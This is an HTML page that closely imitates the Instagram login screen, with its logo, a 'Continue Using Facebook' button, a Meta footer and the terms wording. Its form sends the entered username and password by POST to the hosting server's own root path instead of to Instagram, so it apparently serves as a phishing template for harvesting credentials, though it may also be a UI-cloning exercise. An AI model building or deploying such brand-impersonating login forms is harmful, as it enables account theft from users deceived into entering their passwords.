<html>
 <head>
    <meta  charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
   Instagram Login
  </title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
   body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            overflow-x: hidden;
            flex-direction: column;
        }
        .language {
            font-size: 14px;
            color: #999;
            margin-bottom: 20px;
            margin-top: 6px;
            position: absolute;
            top: 10px;
            text-align: center;
            width: 100%;
        }
        .language select {
            border: none;
            background: none;
            font-size: 14px;
            color: #8e8e8e; /* Custom color */
        }
        .container {
            text-align: center;
            width: 300px;
            margin-top: -40;
            margin-bottom: 70px;
        }
        .container img {
            width: 65%;
            margin-bottom: 50px; /* Adjusted margin to shift it a bit above */
        }
        .container h1 {
            font-family: 'Billabong', cursive;
            font-size: 50px;
            margin: 0;
            margin-bottom: 10px; /* Adjusted margin to shift it a bit above */
        }
        .container .facebook-btn {
            background-color: #0095f6; /* Custom color */
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            font-size: 14px;
            margin-top: 0;
            margin-bottom: 10px;
            cursor: pointer;
        }
        .container .facebook-btn i {
            margin-right: 5px;
        }
        .container .or {
            display: flex;
            align-items: center;
            text-align: center;
            color: #403d39; /* Grey color */
            font-weight: bold; /* Bold text */
            margin: 20px 0;
        }
        .container .or::before,
        .container .or::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .container .or::before {
            margin-right: 10px;
        }
        .container .or::after {
            margin-left: 10px;
        }
        .container input[type="text"],
        .container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border-color: #8e8e8e;
            outline: none;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; /* Custom font family */
            color: black;
            background: #edede9; /* Grey color for the text */
        }
        .container .forgot-password {
            color: #0095f6; /* Custom color */
            font-size: 14px;
            margin: 10px 0;
            display: block;
            text-align: right; /* Shift to the right */
            text-decoration: none; /* Remove underline */
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; /* Custom font family */
        }
        .container .login-btn {
            background-color: #0095f6; /* Custom color */
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            font-size: 14px;
            margin: 10px 0;
            cursor: pointer;
        }
        .container .signup {
            font-size: 14px;
            margin: 20px 0;
            color: grey; /* Grey color for the text */
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; /* Custom font family */
        }
        .container .signup a {
            color: #0095f6; /* Custom color for the link */
            font-weight: 600; /* Custom font weight for the link */
            text-decoration: none;
        }
        .container .terms {
            font-size: 14px;
            color: #999;
            margin-top: 20px;
            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; /* Custom font family */
        }
        .container .terms a {
            color: #000; /* Darker color for the links */
            text-decoration: none;
            font-weight: bold; /* Bold text for emphasis */
        }
        footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            min-height: 50px;
            padding: 0 0;
            text-align: center;
            font-size: 14px;
            background-color: white; /* Ensure white background for the line */
        }

        .footer-divider {
            width: 100%;
            height: 1px;
            background-color: #dbdbdb;
        }

        .footer-text {
            font-size: 14px;
            text-align: center;
            margin-top: 0;
            margin-bottom: -20;
            padding-bottom: 5px;
            color: #000;
        }

        .footer-logo img{ /* Keeps the aspect ratio */
            width: 70% !important;
            display: block;
            margin: 0 auto; /* Centers the image */
        }
        

        .meta-footer {
            background-color: #f0f0f0; /* Grey background for footer content only */
            padding: 10px 0;
            color: #999;
            font-size: 14px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .meta-footer img {
            width: 20%;
            margin-top: 5px;
        }
  </style>
 </head>
 <body>
  <div class="language">
   <select>
    <option>
     English (UK)
    </option>
    <!-- Add other languages as needed -->
   </select>
  </div>
  <div class="container">
   <img alt="Instagram logo" height="" src="/static/images/instagram-logo.png" width = ''/>
   <button class="facebook-btn">
    <i class="fab fa-facebook-square">
    </i>
    Continue Using Facebook
   </button>
   <div class="or">
    OR
   </div>

   <form action="/" method="post">
    <input placeholder="Phone number, username or email address" type="text" id="username" name="username" required />
    <input placeholder="Password" type="password" id="password" name="password" required />
    <a class="forgot-password" href="#">Forgotten your password?</a>
    <button class="login-btn" type="submit">Log in</button>
    </form>


   <div class="signup">
    Don't have an account?
    <a href="#">
     Sign up
    </a>
   </div>
   <div class="terms">
    By continuing, you agree to Instagram's
    <a href="#">
     Terms of Use
    </a>
    and
    <a href="#">
     Privacy Policy
    </a>

   </div>
   <!-- <div class="meta">
    from
    <img alt="Meta logo" height="20" src="https://storage.googleapis.com/a1aa/image/mldEQAV3LU5jLBf7BJbGKC7LV9fSkQ8JvicO7flihFz0QyKnA.jpg" width="50"/>
   </div> -->
  </div>
  <footer>
    <div class="footer-divider"></div> <!-- Horizontal line -->
    <div class="meta-footer">
        <div class="footer-text">from</div>
        <img class="footer-logo" src="/static/images/meta_icon-removebg-preview.png" alt="Meta logo" >
    </div>
</footer>

 </body>
</html>
